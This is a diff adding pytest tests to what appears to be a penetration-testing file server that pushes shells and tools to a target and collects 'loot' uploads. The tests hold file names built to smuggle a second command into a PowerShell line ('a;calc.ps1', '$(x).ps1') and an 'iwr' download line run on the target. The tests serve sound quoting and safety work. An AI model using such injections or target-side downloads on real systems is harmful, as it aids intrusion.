@@ -144,6 +144,27 @@ def test_download_lines_follow_the_box_s_os(os_name, expected):
     assert serving.download_lines(os_name, "http://a/f.exe", "f.exe") == expected
 
 
+@pytest.mark.parametrize(
+    "name, shown",
+    [
+        ("my tool.ps1", "'my tool.ps1'"),
+        ("a;calc.ps1", "'a;calc.ps1'"),
+        ("it's.ps1", "'it''s.ps1'"),
+        ("$(x).ps1", "'$(x).ps1'"),
+        # PowerShell takes each of these as a single quote too; doubled, each stays in the string
+        ("a\u2019; x.ps1", "'a\u2019\u2019; x.ps1'"),
+        ("\u2018a\u201a\u201b.ps1", "'\u2018\u2018a\u201a\u201a\u201b\u201b.ps1'"),
+        # a name starting with - would be read as a parameter, and one starting with a digit as a number
+        ("-Headers", "'-Headers'"),
+        ("0x10", "'0x10'"),
+        ("1kb", "'1kb'"),
+    ],
+)
+def test_a_file_name_that_is_not_plain_is_quoted_for_powershell(name, shown):
+    # the line is pasted into PowerShell on the target: a space or ; in a name must not end it
+    assert serving.download_lines("windows", "http://a/f", name) == [f"iwr http://a/f -OutFile {shown}"]
+
+
 def test_find_serves_the_target_s_files_and_the_tools(served):
     folder, tools = served
     assert serving.find(folder, tools, f"/{SECRET}/shell.ps1", SECRET) == folder / "shell.ps1"
@@ -184,6 +205,18 @@ def test_find_and_offered_leave_out_links(served, tmp_path):
     assert serving.find(folder, tools, f"/{SECRET}/link.txt", SECRET) is None
     assert serving.find(folder, tools, f"/{SECRET}/inner/a%20b.txt", SECRET) is None
     assert "/link.txt" not in [p for p, _ in serving.offered(folder, tools)]
+
+
+def test_a_name_that_is_a_tool_s_folder_is_the_tool_s_only(tmp_path):
+    # as the listing says: under a tool's name only the tool's own files are served
+    folder, tools = tmp_path / "upload", tmp_path / "tools"
+    (tools / "pspy").mkdir(parents=True)
+    (tools / "pspy" / "pspy64").write_bytes(b"tool")
+    (folder / "pspy").mkdir(parents=True)
+    (folder / "pspy" / "mine.txt").write_text("mine")
+    assert "/pspy/mine.txt" not in [p for p, _ in serving.offered(folder, tools)]
+    assert serving.find(folder, tools, f"/{SECRET}/pspy/mine.txt", SECRET) is None
+    assert serving.find(folder, tools, f"/{SECRET}/pspy/pspy64", SECRET) == tools / "pspy" / "pspy64"
 
 
 # ---- the marker
@@ -533,6 +566,32 @@ def test_receive_refuses_what_would_fill_the_disk(tmp_path, monkeypatch):
     with pytest.raises(serving.NoRoom):
         serving.receive_into(tmp_path / "loot", "x.bin", 11, io.BytesIO(b"x" * 11))
     assert serving.receive_into(tmp_path / "loot", "x.bin", 10, io.BytesIO(b"x" * 10)).read_bytes() == b"x" * 10
+
+
+def test_uploads_at_the_same_time_share_the_room_left(tmp_path, monkeypatch):
+    # serve takes each upload in a thread of its own: each one counts what the others still have to
+    # write, or together they would fill the disk past the room it keeps
+    import io
+    from collections import namedtuple
+
+    usage = namedtuple("usage", "total used free")
+    monkeypatch.setattr(serving.shutil, "disk_usage", lambda path: usage(0, 0, serving.ROOM_LEFT + 150))
+    loot = tmp_path / "loot"
+    seen = []
+
+    class Slow(io.BytesIO):
+        # the second upload arrives while the first is still being written
+        def read(self, size=-1):
+            if not seen:
+                with pytest.raises(serving.NoRoom) as refused:
+                    serving.receive_into(loot, "two.bin", 100, io.BytesIO(b"y" * 100))
+                seen.append(refused.value)
+            return super().read(size)
+
+    assert serving.receive_into(loot, "one.bin", 100, Slow(b"x" * 100)).read_bytes() == b"x" * 100
+    assert len(seen) == 1
+    # and once the first is done, what it held back is free again
+    assert serving.receive_into(loot, "three.bin", 100, io.BytesIO(b"z" * 100)).exists()
 
 
 @pytest.mark.parametrize(
